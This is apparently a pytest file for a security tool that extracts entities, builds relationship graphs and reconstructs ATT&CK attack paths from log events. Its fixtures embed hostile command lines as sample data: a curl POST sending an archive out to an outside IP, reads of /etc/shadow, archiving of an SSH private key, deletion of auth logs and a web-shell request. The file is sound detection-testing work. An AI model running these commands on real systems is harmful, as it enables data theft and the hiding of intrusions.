"""
组员4模块测试代码 - 实体关系图与攻击路径重建
测试模块：
1. EntityExtractor - 实体抽取器
2. EntityGraphBuilder - 关系图构建器
3. AttackPathRebuilder - 攻击路径重建器
4. AttackerProfiler - 攻击者画像生成器

包含大量测试用例和示例
"""

import sys
import os

# 添加项目根目录到Python路径
project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

import pytest
from datetime import datetime
from analyzer.graph_analyzer.entity_extractor import EntityExtractor
from analyzer.graph_analyzer.graph_builder import EntityGraphBuilder
from analyzer.graph_analyzer.path_rebuilder import AttackPathRebuilder
from analyzer.graph_analyzer.attacker_profiler import AttackerProfiler


# ============================================
# 测试数据准备 - 大量示例事件
# ============================================

class TestData:
    """测试数据生成器"""
    
    @staticmethod
    def create_ssh_login_event():
        """SSH登录事件"""
        return {
            "@timestamp": "2024-01-01T10:00:00Z",
            "source": {"ip": "1.2.3.4", "port": 12345},
            "destination": {"ip": "192.168.1.10", "port": 22},
            "event": {"category": "authentication", "outcome": "success", "action": "ssh_login"},
            "user": {"name": "root"},
            "host": {"name": "web-server-01"},
            "network": {"application": "ssh", "protocol": "tcp"},
            "message": "SSH login successful from 1.2.3.4"
        }
    
    @staticmethod
    def create_process_exec_event():
        """进程执行事件"""
        return {
            "@timestamp": "2024-01-01T10:00:05Z",
            "source": {"ip": "1.2.3.4"},
            "process": {
                "pid": 1234,
                "name": "bash",
                "executable": "/bin/bash",
                "command_line": "cat /etc/passwd",
                "parent": {"pid": 1000, "name": "sshd", "executable": "/usr/sbin/sshd"},
                "user": {"name": "root", "id": "0"}
            },
            "file": {"path": "/etc/passwd", "name": "passwd"},
            "user": {"name": "root"},
            "host": {"name": "web-server-01"},
            "event": {"category": "process", "action": "process_started", "outcome": "success"},
            "threat": {
                "tactic": {"id": "TA0002", "name": "Execution"},
                "technique": {"id": "T1059", "name": "Command and Scripting Interpreter"}
            }
        }
    
    @staticmethod
    def create_file_creation_event():
        """文件创建事件"""
        return {
            "@timestamp": "2024-01-01T10:00:10Z",
            "source": {"ip": "1.2.3.4"},
            "process": {
                "pid": 1234,
                "name": "bash",
                "executable": "/bin/bash",
                "command_line": "touch /tmp/backdoor.sh",
                "user": {"name": "root"}
            },
            "file": {"path": "/tmp/backdoor.sh", "name": "backdoor.sh"},
            "user": {"name": "root"},
            "host": {"name": "web-server-01"},
            "event": {"category": "file", "action": "file_created", "outcome": "success"},
            "threat": {
                "tactic": {"id": "TA0003", "name": "Persistence"},
                "technique": {"id": "T1053", "name": "Scheduled Task/Job"}
            }
        }
    
    @staticmethod
    def create_lateral_movement_event():
        """横向移动事件"""
        return {
            "@timestamp": "2024-01-01T10:00:15Z",
            "source": {"ip": "1.2.3.4"},
            "destination": {"ip": "192.168.1.20", "port": 22},
            "event": {"category": "network", "action": "connection_established"},
            "network": {"application": "ssh", "protocol": "tcp", "direction": "outbound"},
            "host": {"name": "web-server-01"},
            "threat": {
                "tactic": {"id": "TA0008", "name": "Lateral Movement"},
                "technique": {"id": "T1021", "name": "Remote Services"}
            }
        }
    
    @staticmethod
    def create_data_exfiltration_event():
        """数据外传事件"""
        return {
            "@timestamp": "2024-01-01T10:00:20Z",
            "source": {"ip": "1.2.3.4"},
            "destination": {"ip": "5.6.7.8", "port": 80},
            "process": {
                "pid": 5678,
                "name": "curl",
                "command_line": "curl -X POST http://5.6.7.8/upload -d @/tmp/data.tar.gz",
                "user": {"name": "root"}
            },
            "file": {"path": "/tmp/data.tar.gz"},
            "network": {"application": "http", "bytes": 1024000, "direction": "outbound"},
            "host": {"name": "web-server-01"},
            "event": {"category": "network", "action": "data_transfer"},
            "threat": {
                "tactic": {"id": "TA0010", "name": "Exfiltration"},
                "technique": {"id": "T1041", "name": "Exfiltration Over C2 Channel"}
            }
        }
    
    @staticmethod
    def create_privilege_escalation_event():
        """权限提升事件"""
        return {
            "@timestamp": "2024-01-01T10:00:12Z",
            "source": {"ip": "1.2.3.4"},
            "process": {
                "pid": 2345,
                "name": "sudo",
                "executable": "/usr/bin/sudo",
                "command_line": "sudo su -",
                "parent": {"pid": 1234, "name": "bash"},
                "user": {"name": "www-data", "id": "33"}
            },
            "user": {"name": "www-data"},
            "host": {"name": "web-server-01"},
            "event": {"category": "process", "action": "privilege_escalation", "outcome": "success"},
            "threat": {
                "tactic": {"id": "TA0004", "name": "Privilege Escalation"},
                "technique": {"id": "T1548", "name": "Abuse Elevation Control Mechanism"}
            }
        }
    
    @staticmethod
    def create_network_scan_event():
        """网络扫描事件"""
        return {
            "@timestamp": "2024-01-01T10:00:08Z",
            "source": {"ip": "1.2.3.4"},
            "destination": {"ip": "192.168.1.0", "port": 0},
            "process": {
                "pid": 3456,
                "name": "nmap",
                "executable": "/usr/bin/nmap",
                "command_line": "nmap -sn 192.168.1.0/24",
                "user": {"name": "root"}
            },
            "network": {"protocol": "tcp", "direction": "outbound"},
            "host": {"name": "web-server-01"},
            "event": {"category": "network", "action": "network_scan"},
            "threat": {
                "tactic": {"id": "TA0007", "name": "Discovery"},
                "technique": {"id": "T1018", "name": "Remote System Discovery"}
            }
        }
    
    @staticmethod
    def create_empty_event():
        """空事件（边界测试）"""
        return {
            "@timestamp": "2024-01-01T10:00:00Z",
            "event": {"category": "unknown"}
        }
    
    @staticmethod
    def create_minimal_event():
        """最小事件（只有时间戳）"""
        return {
            "@timestamp": "2024-01-01T10:00:00Z"
        }
    
    @staticmethod
    def create_complex_process_tree_event():
        """复杂进程树事件"""
        return {
            "@timestamp": "2024-01-01T10:00:25Z",
            "source": {"ip": "1.2.3.4"},
            "process": {
                "pid": 9999,
                "name": "python",
                "executable": "/usr/bin/python3",
                "command_line": "python3 -c 'import os; os.system(\"bash\")'",
                "parent": {
                    "pid": 8888,
                    "name": "bash",
                    "executable": "/bin/bash",
                    "parent": {
                        "pid": 7777,
                        "name": "sshd",
                        "executable": "/usr/sbin/sshd"
                    }
                },
                "user": {"name": "root"}
            },
            "host": {"name": "web-server-01"},
            "event": {"category": "process", "action": "process_started"}
        }
    
    @staticmethod
    def create_multiple_files_event():
        """多文件操作事件"""
        return {
            "@timestamp": "2024-01-01T10:00:30Z",
            "source": {"ip": "1.2.3.4"},
            "process": {
                "pid": 1111,
                "name": "tar",
                "command_line": "tar -czf /tmp/backup.tar.gz /etc/passwd /etc/shadow /home/user/.ssh/id_rsa",
                "user": {"name": "root"}
            },
            "file": {"path": "/tmp/backup.tar.gz"},
            "host": {"name": "web-server-01"},
            "event": {"category": "file", "action": "file_created"}
        }
    
    @staticmethod
    def create_dns_tunnel_event():
        """DNS隧道事件（隐蔽信道）"""
        return {
            "@timestamp": "2024-01-01T10:00:35Z",
            "source": {"ip": "1.2.3.4"},
            "destination": {"ip": "8.8.8.8", "port": 53},
            "process": {
                "pid": 2222,
                "name": "dig",
                "command_line": "dig aVeryLongRandomString.example.com",
                "user": {"name": "root"}
            },
            "network": {"application": "dns", "protocol": "udp"},
            "host": {"name": "web-server-01"},
            "event": {"category": "network", "action": "dns_query"}
        }
    
    @staticmethod
    def create_web_exploit_event():
        """Web漏洞利用事件"""
        return {
            "@timestamp": "2024-01-01T09:59:55Z",
            "source": {"ip": "1.2.3.4", "port": 54321},
            "destination": {"ip": "192.168.1.10", "port": 80},
            "network": {"application": "http", "protocol": "tcp"},
            "host": {"name": "web-server-01"},
            "event": {"category": "network", "action": "http_request", "outcome": "success"},
            "message": "GET /index.php?cmd=whoami HTTP/1.1",
            "threat": {
                "tactic": {"id": "TA0001", "name": "Initial Access"},
                "technique": {"id": "T1190", "name": "Exploit Public-Facing Application"}
            }
        }
    
    @staticmethod
    def create_credential_access_event():
        """凭证获取事件"""
        return {
            "@timestamp": "2024-01-01T10:00:18Z",
            "source": {"ip": "1.2.3.4"},
            "process": {
                "pid": 3333,
                "name": "cat",
                "command_line": "cat /etc/shadow",
                "user": {"name": "root"}
            },
            "file": {"path": "/etc/shadow"},
            "host": {"name": "web-server-01"},
            "event": {"category": "file", "action": "file_read"},
            "threat": {
                "tactic": {"id": "TA0006", "name": "Credential Access"},
                "technique": {"id": "T1005", "name": "Data from Local System"}
            }
        }
    
    @staticmethod
    def create_defense_evasion_event():
        """防御规避事件"""
        return {
            "@timestamp": "2024-01-01T10:00:22Z",
            "source": {"ip": "1.2.3.4"},
            "process": {
                "pid": 4444,
                "name": "rm",
                "command_line": "rm -rf /var/log/auth.log",
                "user": {"name": "root"}
            },
            "file": {"path": "/var/log/auth.log"},
            "host": {"name": "web-server-01"},
            "event": {"category": "file", "action": "file_deleted"},
            "threat": {
                "tactic": {"id": "TA0005", "name": "Defense Evasion"},
                "technique": {"id": "T1070", "name": "Indicator Removal on Host"}
            }
        }
    
    @staticmethod
    def get_full_attack_chain_events():
        """完整的攻击链事件序列"""
        return [
            TestData.create_web_exploit_event(),  # 初始访问
            TestData.create_ssh_login_event(),    # 认证成功
            TestData.create_process_exec_event(), # 执行
            TestData.create_network_scan_event(), # 发现
            TestData.create_file_creation_event(), # 持久化
            TestData.create_privilege_escalation_event(), # 提权
            TestData.create_credential_access_event(), # 凭证获取
            TestData.create_lateral_movement_event(), # 横向移动
            TestData.create_defense_evasion_event(), # 防御规避
            TestData.create_data_exfiltration_event() # 数据外传
        ]


# ============================================
# 测试 EntityExtractor - 实体抽取器
# ============================================

class TestEntityExtractor:
    """实体抽取器测试"""
    
    def setup_method(self):
        """每个测试前初始化"""
        self.extractor = EntityExtractor()
    
    def test_extract_ssh_login_entities(self):
        """测试SSH登录事件的实体抽取"""
        event = TestData.create_ssh_login_event()
        entities = self.extractor.extract(event)
        
        # 应该提取出：源IP、目标IP、用户、主机
        assert len(entities) >= 4
        
        # 检查源IP
        source_ip = next((e for e in entities if e["type"] == "ip" and e.get("role") == "source"), None)
        assert source_ip is not None
        assert source_ip["value"] == "1.2.3.4"
        assert source_ip["id"] == "ip:1.2.3.4"
        
        # 检查目标IP
        dest_ip = next((e for e in entities if e["type"] == "ip" and e.get("role") == "destination"), None)
        assert dest_ip is not None
        assert dest_ip["value"] == "192.168.1.10"
        
        # 检查用户
        user = next((e for e in entities if e["type"] == "user"), None)
        assert user is not None
        assert user["value"] == "root"
        
        # 检查主机
        host = next((e for e in entities if e["type"] == "host"), None)
        assert host is not None
        assert host["value"] == "web-server-01"
    
    def test_extract_process_entities(self):
        """测试进程事件的实体抽取"""
        event = TestData.create_process_exec_event()
        entities = self.extractor.extract(event)
        
        # 应该提取出：源IP、进程、父进程、文件、用户、主机
        assert len(entities) >= 6
        
        # 检查进程
        process = next((e for e in entities if e["type"] == "process" and e.get("role") != "parent"), None)
        assert process is not None
        assert process["value"] == "bash"
        assert process["pid"] == 1234
        assert process["id"] == "process:bash:1234"
        
        # 检查父进程
        parent = next((e for e in entities if e["type"] == "process" and e.get("role") == "parent"), None)
        assert parent is not None
        assert parent["value"] == "sshd"
        assert parent["pid"] == 1000
        
        # 检查文件
        file_entity = next((e for e in entities if e["type"] == "file"), None)
        assert file_entity is not None
        assert file_entity["value"] == "/etc/passwd"
    
    def test_extract_file_creation_entities(self):
        """测试文件创建事件的实体抽取"""
        event = TestData.create_file_creation_event()
        entities = self.extractor.extract(event)
        
        # 应该提取出：源IP、进程、文件、用户、主机
        assert len(entities) >= 5
        
        # 检查文件
        file_entity = next((e for e in entities if e["type"] == "file"), None)
        assert file_entity is not None
        assert file_entity["value"] == "/tmp/backdoor.sh"
        assert file_entity["id"] == "file:/tmp/backdoor.sh"
    
    def test_extract_network_entities(self):
        """测试网络事件的实体抽取"""
        event = TestData.create_lateral_movement_event()
        entities = self.extractor.extract(event)
        
        # 应该提取出：源IP、目标IP、主机
        assert len(entities) >= 3
        
        source_ip = next((e for e in entities if e["type"] == "ip" and e.get("role") == "source"), None)
        dest_ip = next((e for e in entities if e["type"] == "ip" and e.get("role") == "destination"), None)
        
        assert source_ip is not None
        assert dest_ip is not None
        assert source_ip["value"] == "1.2.3.4"
        assert dest_ip["value"] == "192.168.1.20"
    
    def test_extract_empty_event(self):
        """测试空事件的实体抽取（边界情况）"""
        event = TestData.create_empty_event()
        entities = self.extractor.extract(event)
        
        # 空事件应该返回空列表或只有时间戳相关实体
        assert isinstance(entities, list)
        # 空事件可能没有实体，这是正常的
    
    def test_extract_minimal_event(self):
        """测试最小事件的实体抽取"""
        event = TestData.create_minimal_event()
        entities = self.extractor.extract(event)
        
        # 最小事件可能没有实体
        assert isinstance(entities, list)
    
    def test_extract_complex_process_tree(self):
        """测试复杂进程树的实体抽取"""
        event = TestData.create_complex_process_tree_event()
        entities = self.extractor.extract(event)
        
        # 应该提取出进程和父进程
        processes = [e for e in entities if e["type"] == "process"]
        assert len(processes) >= 1
        
        # 检查主进程
        main_process = next((e for e in processes if e["value"] == "python"), None)
        assert main_process is not None
    
    def test_extract_multiple_ips(self):
        """测试包含多个IP的事件"""
        event = {
            "@timestamp": "2024-01-01T10:00:00Z",
            "source": {"ip": "1.2.3.4", "port": 12345},
            "destination": {"ip": "5.6.7.8", "port": 80},
            "host": {"ip": ["192.168.1.10", "192.168.1.11"]},
            "event": {"category": "network"}
        }
        entities = self.extractor.extract(event)
        
        # 应该提取出源IP和目标IP
        source_ip = next((e for e in entities if e["type"] == "ip" and e.get("role") == "source"), None)
        dest_ip = next((e for e in entities if e["type"] == "ip" and e.get("role") == "destination"), None)
        
        assert source_ip is not None
        assert dest_ip is not None
    
    def test_extract_user_entities(self):
        """测试用户实体抽取"""
        event = {
            "@timestamp": "2024-01-01T10:00:00Z",
            "user": {"name": "admin", "id": "1000"},
            "process": {
                "pid": 1234,
                "name": "bash",
                "user": {"name": "admin", "id": "1000"}
            },
            "event": {"category": "process"}
        }
        entities = self.extractor.extract(event)
        
        # 应该提取出用户实体
        user = next((e for e in entities if e["type"] == "user"), None)
        assert user is not None
        assert user["value"] == "admin"
        assert user["id"] == "user:admin"
    
    def test_extract_host_entities(self):
        """测试主机实体抽取"""
        event = {
            "@timestamp": "2024-01-01T10:00:00Z",
            "host": {"name": "db-server-01", "hostname": "db-server-01.local"},
            "event": {"category": "host"}
        }
        entities = self.extractor.extract(event)
        
        # 应该提取出主机实体
        host = next((e for e in entities if e["type"] == "host"), None)
        assert host is not None
        assert host["value"] == "db-server-01"
        assert host["id"] == "host:db-server-01"
    
    def test_extract_all_entity_types(self):
        """测试提取所有类型的实体"""
        event = {
            "@timestamp": "2024-01-01T10:00:00Z",
            "source": {"ip": "1.2.3.4"},
            "destination": {"ip": "5.6.7.8"},
            "host": {"name": "test-host"},
            "process": {
                "pid": 1234,
                "name": "test-process",
                "parent": {"pid": 1000, "name": "parent-process"}
            },
            "file": {"path": "/tmp/test.txt"},
            "user": {"name": "testuser"},
            "event": {"category": "process"}
        }
        entities = self.extractor.extract(event)
        
        # 应该提取出所有类型的实体
        entity_types = {e["type"] for e in entities}
        assert "ip" in entity_types
        assert "process" in entity_types
        assert "file" in entity_types
        assert "user" in entity_types
        assert "host" in entity_types


# ============================================
# 测试 EntityGraphBuilder - 关系图构建器
# ============================================

class TestEntityGraphBuilder:
    """关系图构建器测试"""
    
    def setup_method(self):
        """每个测试前初始化"""
        self.builder = EntityGraphBuilder()
    
    def test_build_simple_graph(self):
        """测试构建简单关系图"""
        events = [
            TestData.create_ssh_login_event(),
            TestData.create_process_exec_event()
        ]
        
        graph = self.builder.build(events)
        
        assert "nodes" in graph
        assert "edges" in graph
        assert isinstance(graph["nodes"], list)
        assert isinstance(graph["edges"], list)
        
        # 应该有节点
        assert len(graph["nodes"]) > 0
        
        # 检查节点去重
        node_ids = [n["id"] for n in graph["nodes"]]
        assert len(node_ids) == len(set(node_ids))  # 无重复
    
    def test_build_process_spawn_relationship(self):
        """测试进程启动关系"""
        events = [TestData.create_process_exec_event()]
        
        graph = self.builder.build(events)
        
        # 应该包含父子进程关系
        spawned_edges = [e for e in graph["edges"] if e["relation"] == "spawned"]
        assert len(spawned_edges) > 0
        
        # 检查关系是否正确
        for edge in spawned_edges:
            assert "source" in edge
            assert "target" in edge
            assert "timestamp" in edge
    
    def test_build_file_access_relationship(self):
        """测试文件访问关系"""
        events = [
            TestData.create_process_exec_event(),  # 进程读取文件
            TestData.create_file_creation_event()  # 进程创建文件
        ]
        
        graph = self.builder.build(events)
        
        # 应该包含文件操作关系
        file_edges = [e for e in graph["edges"] 
                     if "file:" in e["target"] or "file:" in e["source"]]
        assert len(file_edges) > 0
    
    def test_build_network_connection_relationship(self):
        """测试网络连接关系"""
        events = [
            TestData.create_ssh_login_event(),
            TestData.create_lateral_movement_event()
        ]
        
        graph = self.builder.build(events)
        
        # 应该包含网络连接关系
        connection_edges = [e for e in graph["edges"] 
                          if e["relation"] == "connected_to"]
        assert len(connection_edges) > 0
    
    def test_build_complex_graph(self):
        """测试构建复杂关系图"""
        events = TestData.get_full_attack_chain_events()
        
        graph = self.builder.build(events)
        
        # 应该有大量节点和边
        assert len(graph["nodes"]) > 10
        assert len(graph["edges"]) > 5
        
        # 检查节点类型多样性
        node_types = {n["type"] for n in graph["nodes"]}
        assert len(node_types) >= 3  # 至少包含IP、进程、文件等
    
    def test_node_deduplication(self):
        """测试节点去重"""
        # 创建包含重复实体的多个事件
        events = [
            TestData.create_ssh_login_event(),
            TestData.create_ssh_login_event(),  # 重复事件
            TestData.create_process_exec_event()
        ]
        
        graph = self.builder.build(events)
        
        # 检查节点ID唯一性
        node_ids = [n["id"] for n in graph["nodes"]]
        assert len(node_ids) == len(set(node_ids))
    
    def test_edge_timestamps(self):
        """测试边的时间戳"""
        events = [
            TestData.create_ssh_login_event(),
            TestData.create_process_exec_event()
        ]
        
        graph = self.builder.build(events)
        
        # 所有边都应该有时间戳
        for edge in graph["edges"]:
            assert "timestamp" in edge
            assert edge["timestamp"] is not None
    
    def test_build_empty_events(self):
        """测试空事件列表"""
        graph = self.builder.build([])
        
        assert graph["nodes"] == []
        assert graph["edges"] == []
    
    def test_build_single_event(self):
        """测试单个事件"""
        events = [TestData.create_ssh_login_event()]
        
        graph = self.builder.build(events)
        
        assert len(graph["nodes"]) > 0
        # 单个事件可能没有边（如果没有关系）
    
    def test_build_multiple_relationships(self):
        """测试多种关系类型"""
        events = [
            TestData.create_process_exec_event(),  # 进程-文件关系
            TestData.create_ssh_login_event(),    # IP-IP关系
            TestData.create_file_creation_event()  # 进程-文件关系
        ]
        
        graph = self.builder.build(events)
        
        # 应该包含多种关系类型
        relation_types = {e["relation"] for e in graph["edges"]}
        assert len(relation_types) > 0


# ============================================
# 测试 AttackPathRebuilder - 攻击路径重建器
# ============================================

class TestAttackPathRebuilder:
    """攻击路径重建器测试"""
    
    def setup_method(self):
        """每个测试前初始化"""
        self.rebuilder = AttackPathRebuilder()
    
    def test_rebuild_simple_attack_path(self):
        """测试重建简单攻击路径"""
        events = [
            TestData.create_web_exploit_event(),  # 初始访问
            TestData.create_process_exec_event()  # 执行
        ]
        
        path = self.rebuilder.rebuild(events)
        
        assert "attack_id" in path
        assert "stages" in path
        assert "total_events" in path
        assert len(path["stages"]) > 0
    
    def test_rebuild_full_attack_chain(self):
        """测试重建完整攻击链"""
        events = TestData.get_full_attack_chain_events()
        
        path = self.rebuilder.rebuild(events)
        
        # 应该有多个阶段
        assert len(path["stages"]) >= 5
        
        # 检查阶段顺序
        stage_names = [s["stage"] for s in path["stages"]]
        # 初始访问应该在前面
        if "initial_access" in stage_names:
            initial_index = stage_names.index("initial_access")
            # 执行应该在初始访问之后
            if "execution" in stage_names:
                exec_index = stage_names.index("execution")
                assert exec_index >= initial_index
    
    def test_rebuild_stage_grouping(self):
        """测试阶段分组"""
        events = [
            TestData.create_web_exploit_event(),
            TestData.create_process_exec_event(),
            TestData.create_process_exec_event()  # 重复的执行事件
        ]
        
        path = self.rebuilder.rebuild(events)
        
        # 检查执行阶段包含多个事件
        exec_stage = next((s for s in path["stages"] if s["stage"] == "execution"), None)
        if exec_stage:
            assert len(exec_stage["events"]) >= 2
    
    def test_rebuild_tactic_mapping(self):
        """测试ATT&CK战术映射"""
        events = [
            TestData.create_web_exploit_event(),  # TA0001
            TestData.create_process_exec_event(),  # TA0002
            TestData.create_file_creation_event()  # TA0003
        ]
        
        path = self.rebuilder.rebuild(events)
        
        # 检查战术ID映射
        for stage in path["stages"]:
            assert "tactic_id" in stage
            assert "tactic_name" in stage
    
    def test_rebuild_time_range(self):
        """测试时间范围计算"""
        events = [
            TestData.create_web_exploit_event(),  # 最早
            TestData.create_process_exec_event(),
            TestData.create_data_exfiltration_event()  # 最晚
        ]
        
        path = self.rebuilder.rebuild(events)
        
        # 检查每个阶段都有时间范围
        for stage in path["stages"]:
            assert "start_time" in stage
            assert "end_time" in stage
    
    def test_rebuild_stage_description(self):
        """测试阶段描述生成"""
        events = [TestData.create_process_exec_event()]
        
        path = self.rebuilder.rebuild(events)
        
        # 每个阶段应该有描述
        for stage in path["stages"]:
            assert "description" in stage
            assert len(stage["description"]) > 0
    
    def test_rebuild_unknown_tactic(self):
        """测试未知战术处理"""
        events = [{
            "@timestamp": "2024-01-01T10:00:00Z",
            "threat": {
                "tactic": {"id": "TA9999", "name": "Unknown"},  # 未知战术
                "technique": {"id": "T9999", "name": "Unknown"}
            }
        }]
        
        path = self.rebuilder.rebuild(events)
        
        # 应该处理未知战术
        assert len(path["stages"]) > 0
    
    def test_rebuild_no_threat_events(self):
        """测试无威胁信息的事件"""
        events = [{
            "@timestamp": "2024-01-01T10:00:00Z",
            "event": {"category": "process"},
            # 没有threat字段
        }]
        
        path = self.rebuilder.rebuild(events)
        
        # 无威胁信息的事件应该被跳过
        assert path["total_events"] == 0 or len(path["stages"]) == 0
    
    def test_rebuild_multiple_stages_same_tactic(self):
        """测试同一战术的多个阶段"""
        events = [
            TestData.create_process_exec_event(),
            TestData.create_process_exec_event(),
            TestData.create_process_exec_event()
        ]
        
        path = self.rebuilder.rebuild(events)
        
        # 所有执行事件应该归到同一个阶段
        exec_stage = next((s for s in path["stages"] if s["stage"] == "execution"), None)
        if exec_stage:
            assert len(exec_stage["events"]) == 3
    
    def test_rebuild_attack_id_generation(self):
        """测试攻击ID生成"""
        events = [TestData.create_process_exec_event()]
        
        path1 = self.rebuilder.rebuild(events)
        path2 = self.rebuilder.rebuild(events)
        
        # 每次应该生成不同的攻击ID
        assert path1["attack_id"] != path2["attack_id"]
    
    def test_rebuild_all_attack_stages(self):
        """测试所有攻击阶段"""
        events = [
            TestData.create_web_exploit_event(),  # initial_access
            TestData.create_process_exec_event(),  # execution
            TestData.create_file_creation_event(),  # persistence
            TestData.create_privilege_escalation_event(),  # privilege_escalation
            TestData.create_defense_evasion_event(),  # defense_evasion
            TestData.create_credential_access_event(),  # credential_access
            TestData.create_network_scan_event(),  # discovery
            TestData.create_lateral_movement_event(),  # lateral_movement
            TestData.create_data_exfiltration_event()  # exfiltration
        ]
        
        path = self.rebuilder.rebuild(events)
        
        # 应该包含多个不同的阶段
        stage_names = {s["stage"] for s in path["stages"]}
        assert len(stage_names) >= 5


# ============================================
# 测试 AttackerProfiler - 攻击者画像生成器
# ============================================

class TestAttackerProfiler:
    """攻击者画像生成器测试"""
    
    def setup_method(self):
        """每个测试前初始化"""
        self.profiler = AttackerProfiler()
        self.rebuilder = AttackPathRebuilder()
    
    def test_profile_simple_attack(self):
        """测试简单攻击的画像生成"""
        events = [
            TestData.create_web_exploit_event(),
            TestData.create_process_exec_event()
        ]
        
        attack_path = self.rebuilder.rebuild(events)
        profile = self.profiler.profile(attack_path)
        
        assert "attacker_profile" in profile
        assert "source_ips" in profile["attacker_profile"]
        assert "tools_used" in profile["attacker_profile"]
        assert "techniques" in profile["attacker_profile"]
    
    def test_profile_source_ips(self):
        """测试源IP收集"""
        events = [
            TestData.create_web_exploit_event(),  # 1.2.3.4
            TestData.create_ssh_login_event(),    # 1.2.3.4
            TestData.create_process_exec_event()  # 1.2.3.4
        ]
        
        attack_path = self.rebuilder.rebuild(events)
        profile = self.profiler.profile(attack_path)
        
        # 应该收集到源IP
        source_ips = profile["attacker_profile"]["source_ips"]
        assert len(source_ips) > 0
        assert "1.2.3.4" in source_ips
    
    def test_profile_tools_identification(self):
        """测试工具识别"""
        events = [
            TestData.create_process_exec_event(),  # bash
            TestData.create_network_scan_event(),  # nmap
            TestData.create_data_exfiltration_event()  # curl
        ]
        
        attack_path = self.rebuilder.rebuild(events)
        profile = self.profiler.profile(attack_path)
        
        # 应该识别出使用的工具
        tools = profile["attacker_profile"]["tools_used"]
        assert len(tools) > 0
        # bash应该在工具列表中
        assert "bash" in tools
    
    def test_profile_techniques_collection(self):
        """测试技术收集"""
        events = [
            TestData.create_web_exploit_event(),  # T1190
            TestData.create_process_exec_event(),  # T1059
            TestData.create_file_creation_event()  # T1053
        ]
        
        attack_path = self.rebuilder.rebuild(events)
        profile = self.profiler.profile(attack_path)
        
        # 应该收集到使用的技术
        techniques = profile["attacker_profile"]["techniques"]
        assert len(techniques) > 0
    
    def test_profile_target_hosts(self):
        """测试目标主机收集"""
        events = [
            TestData.create_ssh_login_event(),  # web-server-01
            TestData.create_lateral_movement_event()  # 另一个目标
        ]
        
        attack_path = self.rebuilder.rebuild(events)
        profile = self.profiler.profile(attack_path)
        
        # 应该收集到目标主机
        target_hosts = profile["attacker_profile"]["target_hosts"]
        assert len(target_hosts) > 0
    
    def test_profile_risk_level(self):
        """测试风险等级评估"""
        # 简单攻击（少于3个阶段）
        simple_events = [TestData.create_process_exec_event()]
        simple_path = self.rebuilder.rebuild(simple_events)
        simple_profile = self.profiler.profile(simple_path)
        
        # 复杂攻击（多个阶段）
        complex_events = TestData.get_full_attack_chain_events()
        complex_path = self.rebuilder.rebuild(complex_events)
        complex_profile = self.profiler.profile(complex_path)
        
        # 复杂攻击应该有更高的风险等级或更深的攻击链
        assert complex_profile["attacker_profile"]["attack_chain_depth"] >= \
               simple_profile["attacker_profile"]["attack_chain_depth"]
    
    def test_profile_attack_chain_depth(self):
        """测试攻击链深度计算"""
        events = TestData.get_full_attack_chain_events()
        
        attack_path = self.rebuilder.rebuild(events)
        profile = self.profiler.profile(attack_path)
        
        # 应该正确计算攻击链深度
        assert profile["attacker_profile"]["attack_chain_depth"] > 0
        assert profile["attacker_profile"]["attack_chain_depth"] == len(attack_path["stages"])
    
    def test_profile_multiple_attackers(self):
        """测试多个攻击者的情况"""
        events = [
            {
                "@timestamp": "2024-01-01T10:00:00Z",
                "source": {"ip": "1.2.3.4"},
                "threat": {"tactic": {"id": "TA0002", "name": "Execution"}}
            },
            {
                "@timestamp": "2024-01-01T10:00:05Z",
                "source": {"ip": "5.6.7.8"},
                "threat": {"tactic": {"id": "TA0002", "name": "Execution"}}
            }
        ]
        
        attack_path = self.rebuilder.rebuild(events)
        profile = self.profiler.profile(attack_path)
        
        # 应该收集到多个源IP
        source_ips = profile["attacker_profile"]["source_ips"]
        assert len(source_ips) >= 2
    
    def test_profile_empty_attack_path(self):
        """测试空攻击路径"""
        empty_path = {
            "stages": [],
            "total_events": 0
        }
        
        profile = self.profiler.profile(empty_path)
        
        # 应该返回空画像
        assert profile["attacker_profile"]["source_ips"] == []
        assert profile["attacker_profile"]["attack_chain_depth"] == 0


# ============================================
# 集成测试 - 完整流程测试
# ============================================

class TestIntegration:
    """集成测试 - 测试完整数据流"""
    
    def test_complete_workflow(self):
        """测试从事件到画像的完整流程"""
        # 1. 准备事件
        events = TestData.get_full_attack_chain_events()
        
        # 2. 实体抽取
        extractor = EntityExtractor()
        all_entities = []
        for event in events:
            entities = extractor.extract(event)
            all_entities.extend(entities)
        
        assert len(all_entities) > 0
        
        # 3. 关系图构建
        builder = EntityGraphBuilder()
        graph = builder.build(events)
        
        assert len(graph["nodes"]) > 0
        assert len(graph["edges"]) > 0
        
        # 4. 攻击路径重建
        rebuilder = AttackPathRebuilder()
        attack_path = rebuilder.rebuild(events)
        
        assert len(attack_path["stages"]) > 0
        
        # 5. 攻击者画像
        profiler = AttackerProfiler()
        profile = profiler.profile(attack_path)
        
        assert "attacker_profile" in profile
        assert len(profile["attacker_profile"]["source_ips"]) > 0
    
    def test_multiple_attack_scenarios(self):
        """测试多个攻击场景"""
        scenarios = [
            # 场景1：Web漏洞利用攻击
            [
                TestData.create_web_exploit_event(),
                TestData.create_process_exec_event(),
                TestData.create_data_exfiltration_event()
            ],
            # 场景2：SSH暴力破解攻击
            [
                TestData.create_ssh_login_event(),
                TestData.create_privilege_escalation_event(),
                TestData.create_credential_access_event()
            ]
        ]
        
        for scenario_events in scenarios:
            # 构建关系图
            builder = EntityGraphBuilder()
            graph = builder.build(scenario_events)
            
            # 重建攻击路径
            rebuilder = AttackPathRebuilder()
            path = rebuilder.rebuild(scenario_events)
            
            # 生成画像
            profiler = AttackerProfiler()
            profile = profiler.profile(path)
            
            # 验证结果
            assert len(graph["nodes"]) > 0
            assert len(path["stages"]) > 0
            assert "attacker_profile" in profile


# ============================================
# 性能测试
# ============================================

class TestPerformance:
    """性能测试"""
    
    def test_large_event_processing(self):
        """测试处理大量事件"""
        # 生成100个事件
        events = []
        for i in range(100):
            event = TestData.create_process_exec_event()
            event["@timestamp"] = f"2024-01-01T10:00:{i:02d}Z"
            events.append(event)
        
        # 测试实体抽取性能
        extractor = EntityExtractor()
        start_time = datetime.now()
        for event in events:
            extractor.extract(event)
        extract_time = (datetime.now() - start_time).total_seconds()
        
        # 测试关系图构建性能
        builder = EntityGraphBuilder()
        start_time = datetime.now()
        graph = builder.build(events)
        build_time = (datetime.now() - start_time).total_seconds()
        
        # 验证性能（应该在合理时间内完成）
        assert extract_time < 10  # 100个事件应该在10秒内处理完
        assert build_time < 10
        
        # 验证结果正确性
        assert len(graph["nodes"]) > 0


# ============================================
# 边界情况测试
# ============================================

